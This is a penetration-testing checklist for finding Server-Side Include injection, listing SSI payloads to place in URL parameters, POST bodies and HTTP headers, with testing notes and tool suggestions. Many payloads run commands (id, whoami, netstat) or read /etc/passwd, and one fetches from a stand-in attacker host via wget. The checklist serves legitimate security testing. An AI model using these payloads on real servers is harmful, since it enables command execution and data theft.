
## Goal:
Detect places where user-controlled input is included in server-side templates or files that are parsed with SSI directives.

---

## Common Filename or Path Insertion
- [ ] `/view?page=index.shtml`
- [ ] `/include?file=about.shtml`
- [ ] `/template=home.shtml`
- [ ] `/load?path=contact.shtml`
- [ ] `/show?doc=products.shtml`
- [ ] `/page?src=../includes/footer.shtml`
- [ ] `/render?html=./welcome.shtml`
- [ ] `/main?template=layout.shtml`
- [ ] `/site?view=news.shtml`
- [ ] `/dynamic?page=info.shtml`

---

## GET/POST Body Parameters
- [ ] `POST /render { template: '<!--#include file="..." -->' }`
- [ ] `POST /profile { bio: '<!--#exec cmd="id" -->' }`
- [ ] `/submit?desc=<!--#echo var="REMOTE_ADDR"-->`
- [ ] `/api/include?component=<!--#include virtual="/etc/passwd" -->`
- [ ] `/api/page?template=<!--#exec cmd="uname -a" -->`
- [ ] `/contact?msg=<!--#printenv -->`
- [ ] `/blog?comment=<!--#config timefmt="%A" -->`
- [ ] `/load?view=<!--#include file="admin.shtml" -->`
- [ ] `/faq?answer=<!--#set var="foo" value="bar" -->`
- [ ] `/invoice?notes=<!--#flastmod file="secrets.txt" -->`

---

## Headers & Metadata Based Injection
- [ ] `User-Agent: <!--#echo var="HTTP_USER_AGENT" -->`
- [ ] `Referer: <!--#exec cmd="ls" -->`
- [ ] `X-Forwarded-For: <!--#printenv -->`
- [ ] `Cookie: session=<!--#include virtual="/secret.html" -->`
- [ ] `X-Template-Name: <!--#exec cmd="whoami" -->`
- [ ] `X-Comment: <!--#include file="/etc/passwd" -->`
- [ ] `X-Footer: <!--#flastmod virtual="/index.html" -->`
- [ ] `X-About: <!--#config errmsg="Pwned!" -->`
- [ ] `Content-Disposition: <!--#exec cmd="netstat -an" -->`
- [ ] `X-SSI-Test: <!--#echo var="DOCUMENT_NAME" -->`

---

## URL Fragments & Obscure Inputs
- [ ] `/search#<!--#exec cmd="ls" -->`
- [ ] `/index.html?section=<!--#include file="etc/passwd" -->`
- [ ] `/help?lang=<!--#printenv -->`
- [ ] `/archive?year=<!--#echo var="DATE_LOCAL" -->`
- [ ] `/feedback?input=<!--#exec cmd="id" -->`
- [ ] `/test#<!--#set var="foo" value="bar" -->`
- [ ] `/info?file=<!--#flastmod virtual="/admin" -->`
- [ ] `/contact#<!--#include virtual="/data" -->`
- [ ] `/pdfgen?footer=<!--#exec cmd="cat flag.txt" -->`
- [ ] `/pdf?note=<!--#echo var="SCRIPT_FILENAME" -->`

---

## SSI Payload Patterns to Try
- [ ] `<!--#echo var="DOCUMENT_URI" -->`
- [ ] `<!--#exec cmd="id" -->`
- [ ] `<!--#include file="/etc/passwd" -->`
- [ ] `<!--#printenv -->`
- [ ] `<!--#flastmod file="index.html" -->`
- [ ] `<!--#config timefmt="%Y-%m-%d" -->`
- [ ] `<!--#set var="TEST" value="123" -->`
- [ ] `<!--#include virtual="/admin/debug" -->`
- [ ] `<!--#exec cmd="env" -->`
- [ ] `<!--#exec cmd="wget http://attacker.com" -->`

---

## Test Notes:
- [ ] Always check for `.shtml`, `.stm`, `.shtm` extensions
- [ ] Confirm server uses Apache/Nginx with SSI support
- [ ] Monitor for **command execution**, **info leakage**, or **file inclusion**
- [ ] Look for pages including dynamic templates via filenames

---

## 🔧 Tools:
- [ ] Burp Suite (manual testing or custom intruder payloads)
- [ ] FFUF + wordlists for discovering `.shtml` pages
- [ ] SSRF/SSI chaining with out-of-band detection (e.g., collaborator)
- [ ] Param-miner to discover hidden SSI-related params
- [ ] Log monitoring if target has debug 

---
